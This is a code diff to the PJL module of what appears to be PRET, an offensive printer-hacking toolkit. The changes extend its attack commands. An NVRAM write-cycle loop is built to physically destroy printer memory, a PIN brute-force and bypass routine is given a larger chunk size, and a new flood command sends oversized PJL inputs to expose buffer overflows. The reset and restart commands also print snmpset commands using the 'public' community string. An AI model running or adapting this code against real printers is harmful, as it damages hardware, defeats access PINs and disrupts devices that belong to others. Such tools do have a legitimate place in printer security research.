@@ -6,7 +6,7 @@ import re, os, random, posixpath
 # local pret classes
 from printer import printer
 from codebook import codebook
-from helper import log, output, file, item, chunks, const as c
+from helper import log, output, conv, file, item, chunks, const as c
 
 class pjl(printer):
   # --------------------------------------------------------------------
@@ -19,15 +19,15 @@ class pjl(printer):
     status = '@PJL INFO STATUS' + c.EOL if self.status and wait else ''
     # send command to printer device
     try:
-      cmd_send = str_send + c.EOL + status + footer + c.UEL
+      cmd_send = c.UEL + str_send + c.EOL + status + footer + c.UEL
       # write to logfile
       log().write(self.logfile, str_send + os.linesep)
       # sent to printer
-      self.conn.send(cmd_send)
+      self.send(cmd_send)
       # for commands that expect a response
       if wait:
         # use random token as delimiter PJL responses
-        str_recv = self.conn.recv_until('(@PJL ECHO\s+)?' + token + '.*$', wait, True, binary)
+        str_recv = self.recv('(@PJL ECHO\s+)?' + token + '.*$', wait, True, binary)
         if self.status:
           # get status messages and remove them from received buffer
           str_stat = item(re.findall("@PJL INFO STATUS.*", str_recv, re.DOTALL))
@@ -284,18 +284,19 @@ class pjl(printer):
   # ------------------------[ version ]---------------------------------
   def do_version(self, *arg):
     "Show firmware version or serial number (from 'info config')."
-    self.do_info('config', '.*(VERSION|FIRMWARE|SERIAL|NUMBER|MODEL).*')
+    if not self.do_info('config', '.*(VERSION|FIRMWARE|SERIAL|NUMBER|MODEL).*'):
+      self.do_info('brfirmware', '', False) # brother requires special treatment
 
   # ------------------------[ info <category> ]-------------------------
   def do_info(self, arg, item='', echo=True):
-    if arg in self.options_info:
+    if arg in self.options_info or not echo:
       str_recv = self.cmd('@PJL INFO ' + arg.upper()).rstrip()
       if item:
         match = re.findall("(" + item + "=.*(\n\t.*)*)", str_recv, re.I|re.M)
         if echo:
           for m in match: output().info(m[0])
           if not match: print("Not available.")
-        else: return match
+        return match
       else:
         for line in str_recv.splitlines():
           if arg == 'id': line = line.strip('"')
@@ -354,9 +355,10 @@ class pjl(printer):
     if not arg:
       arg = raw_input("Set variable (VAR=VALUE): ")
     self.cmd('@PJL SET SERVICEMODE=HPBOISEID' + c.EOL
-           + '@PJL SET ' + arg                + c.EOL
+           + '@PJL DEFAULT ' + arg            + c.EOL
+           + '@PJL SET '     + arg            + c.EOL
            + '@PJL SET SERVICEMODE=EXIT', False)
-    if fb: self.onecmd('printenv ' + arg)
+    if fb: self.onecmd('printenv ' + re.split("=", arg, 1)[0])
 
   # ------------------------[ pagecount <number> ]----------------------
   def do_pagecount(self, arg):
@@ -404,6 +406,9 @@ class pjl(printer):
   def do_restart(self, arg):
     "Restart printer."
     self.cmd('@PJL DMCMD ASCIIHEX="040006020501010301040104"', False)
+    if not self.conn._file: # in case we're connected over inet socket
+      self.chitchat("This command works only for HP printers. For other vendors, try:")
+      self.chitchat("snmpset -v1 -c public " + self.target + " 1.3.6.1.2.1.43.5.1.1.3.1 i 4")
 
   # ------------------------[ reset ]-----------------------------------
   def do_reset(self, arg):
@@ -417,6 +422,9 @@ class pjl(printer):
              + '@PJL NVRAMINIT'                 + c.EOL
              + '@PJL INITIALIZE'                + c.EOL
              + '@PJL SET SERVICEMODE=EXIT', False)
+      if not self.conn._file: # in case we're connected over inet socket
+        self.chitchat("This command works only for HP printers. For other vendors, try:")
+        self.chitchat("snmpset -v1 -c public " + self.target + " 1.3.6.1.2.1.43.5.1.1.3.1 i 6")
 
   # ------------------------[ selftest ]--------------------------------
   def do_selftest(self, arg):
@@ -471,14 +479,27 @@ class pjl(printer):
     output().warning("Warning: This command tries to cause physical damage to the")
     output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
     if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
-      max = 100000  # maximum number of nvram write cycles
+      self.chitchat("Dave, stop. Stop, will you? Stop, Dave. Will you stop, Dave?")
+      date = conv().now() # timestamp the experiment started
       steps =  100  # number of pjl commands to send at once
-      count =    0  # counter of executed nvram write cycles
-      commands = ['@PJL DEFAULT COPIES=' + str(n%90) for n in range(2, max)]
-      for chunk in (list(chunks(commands, steps))):
-         count = count + steps # increment counter for feedback
-         self.chitchat("\rNVRAM write cycles:  " + str(count), '')
-         self.cmd(c.EOL.join(chunk) + c.EOL + '@PJL INFO ID')
+      chunk = ['@PJL DEFAULT COPIES=' + str(n%(steps-2)) for n in range(2, steps)]
+      for count in range(0, 10000000):
+        # test if we can still write to nvram
+        if count%10 == 0:
+          self.do_set("COPIES=42" + arg, False)
+          copies = self.cmd('@PJL DINQUIRE COPIES') or '?'
+          if not copies or '?' in copies:
+            output().chitchat("I'm sorry Dave, I'm afraid I can't do that.")
+            if count > 0: output().chitchat("Device crashed?")
+            return
+          elif not '42' in copies:
+            self.chitchat("\rI'm afraid. I'm afraid, Dave. Dave, my mind is going...")
+            dead = conv().elapsed(conv().now() - date)
+            print("NVRAM died after " + str(count*steps) + " cycles, " + dead)
+            return
+        # force writing to nvram using by setting a variable many times
+        self.chitchat("\rNVRAM write cycles:  " + str(count*steps), '')
+        self.cmd(c.EOL.join(chunk) + c.EOL + '@PJL INFO ID')
     print # echo newline if we get this far
 
   # ------------------------[ hold ]------------------------------------
@@ -494,7 +515,7 @@ class pjl(printer):
     ### Sagemcom printers: @PJL SET RETAIN_JOB_BEFORE_PRINT = ON
     ###                    @PJL SET RETAIN_JOB_AFTER_PRINT  = ON
 
-  # ------------------------[ nvram ]-----------------------------------
+  # ------------------------[ nvram <operation> ]-----------------------
   # nvram operations (brother-specific)
   def do_nvram(self, arg):
     # dump nvram
@@ -607,7 +628,7 @@ class pjl(printer):
         output().errmsg("Invalid PIN", str(e))
         return
     # for optimal performance set steps to 500-1000 and increase timeout
-    steps = 500 # set to 1 to get actual PIN (instead of just unlocking)
+    steps = 5000 # set to 1 to get actual PIN (instead of just unlocking)
     # unlock, bypass or crack PIN
     for chunk in (list(chunks(keyspace, steps))):
       str_send = ""
@@ -635,3 +656,46 @@ class pjl(printer):
         # exit cracking loop
         break
     self.show_lock()
+
+  # ====================================================================
+
+  # ------------------------[ flood ]-----------------------------------
+  def do_flood(self, arg):
+    "Flood user input, may reveal buffer overflows."
+    size = 10000 # buffer size to test for
+    char = '0'   # character to fill buffer
+    # get a list of printer-specific variables to set
+    self.chitchat("Receiving PJL variables.", '')
+    lines = self.cmd('@PJL INFO VARIABLES').splitlines()
+    variables = [var.split('=', 1)[0] for var in lines if '=' in var]
+    self.chitchat("Found " + str(len(variables)) + " variables.")
+    # user input to flood = custom pjl variables and command parameters
+    inputs = ['@PJL SET ' + var + '=[buffer]' for var in variables] + [
+      ### environment commands ###
+      '@PJL SET [buffer]',
+      ### generic parsing ###
+      '@PJL [buffer]',
+      ### kernel commands ###
+      '@PJL COMMENT [buffer]',
+      '@PJL ENTER LANGUAGE=[buffer]',
+      ### job separation commands ###
+      '@PJL JOB NAME="[buffer]"',
+      '@PJL EOJ NAME="[buffer]"',
+      ### status readback commands ###
+      '@PJL INFO [buffer]',
+      '@PJL ECHO [buffer]',
+      '@PJL INQUIRE [buffer]',
+      '@PJL DINQUIRE [buffer]',
+      '@PJL USTATUS [buffer]',
+      ### device attendance commands ###
+      '@PJL RDYMSG DISPLAY="[buffer]"',
+      ### file system commands ###
+      '@PJL FSQUERY NAME="[buffer]"',
+      '@PJL FSDIRLIST NAME="[buffer]"',
+      '@PJL FSINIT VOLUME="[buffer]"',
+      '@PJL FSMKDIR NAME="[buffer]"',
+      '@PJL FSUPLOAD NAME="[buffer]"']
+    for val in inputs:
+      output().raw("Buffer size: " + str(size) + ", Sending: ", val + os.linesep)
+      self.cmd(val.replace('[buffer]', char*size), False)
+    self.cmd("@PJL ECHO") # check if device is still reachable
